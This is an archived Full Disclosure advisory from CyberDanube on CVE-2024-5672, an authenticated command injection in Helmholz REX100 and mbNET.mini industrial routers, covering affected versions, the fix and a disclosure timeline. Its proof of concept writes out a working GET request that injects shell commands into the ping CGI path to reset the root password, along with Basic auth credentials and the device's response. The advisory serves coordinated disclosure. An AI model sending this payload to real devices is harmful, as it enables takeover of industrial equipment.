---
title: CyberDanube Security Research 20240703-0 | Authenticated Command Injection in Helmholz Industrial Router REX100
url: https://seclists.org/fulldisclosure/2024/Jul/6
source: Full Disclosure
date: 2024-07-05
fetch_date: 2025-10-06T17:51:31.859213
---

# CyberDanube Security Research 20240703-0 | Authenticated Command Injection in Helmholz Industrial Router REX100

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](5)
[By Date](date.html#6)
[![Next](/images/right-icon-16x16.png)](7)

[![Previous](/images/left-icon-16x16.png)](5)
[By Thread](index.html#6)
[![Next](/images/right-icon-16x16.png)](7)

![](/shared/images/nst-icons.svg#search)

# CyberDanube Security Research 20240703-0 | Authenticated Command Injection in Helmholz Industrial Router REX100

---

*From*: Thomas Weber via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Wed, 3 Jul 2024 09:09:01 +0000

---

```
CyberDanube Security Research 20240703-0
-------------------------------------------------------------------------------
                title| Authenticated Command Injection
              product| Helmholz Industrial Router REX100
                     | MBConnectline mbNET.mini
   vulnerable version| <= 2.2.11
        fixed version| 2.2.13
           CVE number| CVE-2024-5672
               impact| High
             homepage| https://www.helmholz.de/
                     | https://mbconnectline.com/
                found| 2024-05-08
                   by| S. Dietz (Office Vienna)
                     | CyberDanube Security Research
                     | Vienna | St. PÃ¶lten
                     |
                     | https://www.cyberdanube.com
-------------------------------------------------------------------------------

Vendor description
-------------------------------------------------------------------------------
"Helmholz is your specialist when it comes to sophisticated products for your
automation projects. With current, clever system solutions from Helmholz, the
high demands placed on industrial networks in times of increasing automation
can be met both reliably and efficiently - including a high level of operating
convenience. The broad product spectrum ranges from a decentralized I/O system
to switches and repeaters, gateways, a NAT gateway/firewall and secure IoT
remote machine access."

Source: https://www.helmholz.de/en/company/about-helmholz/

Vulnerable versions
-------------------------------------------------------------------------------
Helmholz Industrial Router REX100 <= 2.2.11
MBConnectline mbNET.mini <= 2.2.11

Vulnerability overview
-------------------------------------------------------------------------------
1) Authenticated Command Injection (CVE-2024-5672)
A command injection was identified on the webserver. This vulnerability can
only be exploited if a user is authenticated on the web interface. This way,
an attacker can invoke commands and is able to get full control over the whole
device.

Proof of Concept
-------------------------------------------------------------------------------
1) Authenticated Command Injection (CVE-2024-5672)
The following GET request changes the password for the root user and returns
the process list of the device.

-------------------------------------------------------------------------------
GET /cgi-bin/ping;echo$IFS'root:password'|chpasswd;ps;.sh HTTP/1.1
Host: 192.168.25.11
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Basic aGVsbWhvbHo6cm91dGVy
Connection: close
Upgrade-Insecure-Requests: 1

-------------------------------------------------------------------------------
HTTP/1.0 200 OK
This is haserl version 0.8.0
This program runs as a cgi interpeter, not interactively.
Bug reports to: Nathan Angelacos <nangel () users sourceforge net>

Password for 'root' changed
  PID USER       VSZ STAT COMMAND
    1 root      2292 S    init
    2 root         0 SW   [kthreadd]
    3 root         0 SW   [ksoftirqd/0]
    4 root         0 SW   [events/0]
    5 root         0 SW   [khelper]
    8 root         0 SW   [async/mgr]
[...]

Solution
-------------------------------------------------------------------------------
Update to latest version: 2.2.13

Workaround
-------------------------------------------------------------------------------
None

Recommendation
-------------------------------------------------------------------------------
CyberDanube recommends Helmholz customers to upgrade the firmware to the latest
version available and to restrict network access to the management interface of
the device.

Contact Timeline
-------------------------------------------------------------------------------
2024-05-15: Contacting Helmholz via psirt () helmholz de.
2024-05-15: Receiving security contact for MBConnectline.
2024-05-21: Contact stated they are working on a fix.
2024-06-13: Received advisory from contact and assigned CVE number.
2024-07-01: Contact sends out final release date.
2024-07-03: Coordinated release of advisory with CERT@VDE.

Web: https://www.cyberdanube.com
Twitter: https://twitter.com/cyberdanube
Mail: research at cyberdanube dot com

EOF S. Dietz / @2024

_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](5)
[By Date](date.html#6)
[![Next](/images/right-icon-16x16.png)](7)

[![Previous](/images/left-icon-16x16.png)](5)
[By Thread](index.html#6)
[![Next](/images/right-icon-16x16.png)](7)

### Current thread:

* **CyberDanube Security Research 20240703-0 | Authenticated Command Injection in Helmholz Industrial Router REX100** *Thomas Weber via Fulldisclosure (Jul 03)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")